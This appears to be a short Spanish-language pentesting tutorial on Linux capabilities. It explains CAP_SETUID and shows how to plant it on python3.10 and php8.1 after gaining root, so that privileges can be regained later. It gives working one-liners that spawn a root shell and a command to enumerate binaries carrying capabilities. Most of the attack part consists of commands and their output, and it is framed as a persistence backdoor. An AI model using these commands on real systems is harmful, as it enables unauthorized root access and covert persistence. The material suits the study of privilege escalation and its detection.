Si bien hasta el momento podemos otorgar *permisos privilegiados* a un usuario ya sea con *SUID* o con *sudo*, pero también existen las *capabilities*.

¿Qué son?
Son capacidades que se le puede asignar a un binario, existen varios [tipos de cabalilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).
Como por ejemplo la capabilitie *CAP_SETUID* que hace referencia a la manipulación de UID de los procesos.

Ahora supongamos que obtuvimos acceso a un sistema con root, y se desea dejar alguna acción que nos permita escalar privilegios fácilmente en caso de desconectarnos.

Vamos a asignar un capabilitie de tipo *CAP_SETUID* a algún binario.

``` bash
❯ setcap cap_setuid+ep /usr/bin/python3.10

❯ getcap /usr/bin/python3.10
/usr/bin/python3.10 cap_setuid=ep
```

Una vez hecho esto podemos buscar los binarios que tengan alguna capabilitie

	getcap -r / 2>/dev/null

Este tipo de capabilitie nos permite ejecutar comando como otro usuario, revelando su uid, cada usuario lo tiene, lo puede visualizar con `id`, si bien sabemos el uid de root es 0.

``` bash
❯ getcap -r / 2>/dev/null
/usr/bin/python3.10 cap_setuid=ep

❯ ls -l /usr/bin/python3.10
.rwxr-xr-x root root 5.6 MB Thu Sep  8 09:34:29 2022  /usr/bin/python3.10
```

Como se puede observar no tiene permiso SUID pero si una capabilitie, ahora como hacemos uso de esta

``` bash
❯ python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
bash-5.2# whoami
root
```

*Remover una capabilitie*

	setcap -r /usr/bin/python3.10

Igualmente en [GTFobins ](https://gtfobins.github.io/#+capabilities) podemos encontrar algunas capabilities las cuales podemos utilizar para escalar privilegios.


*Explotación con php*
``` bash
❯ setcap cap_setuid+ep /usr/bin/php8.1

❯ getcap /usr/bin/php8.1
/usr/bin/php8.1 cap_setuid=ep
```

``` bash
bash-5.2$ php -r "posix_setuid(0); system('/bin/bash');"
bash-5.2# whoami
root
```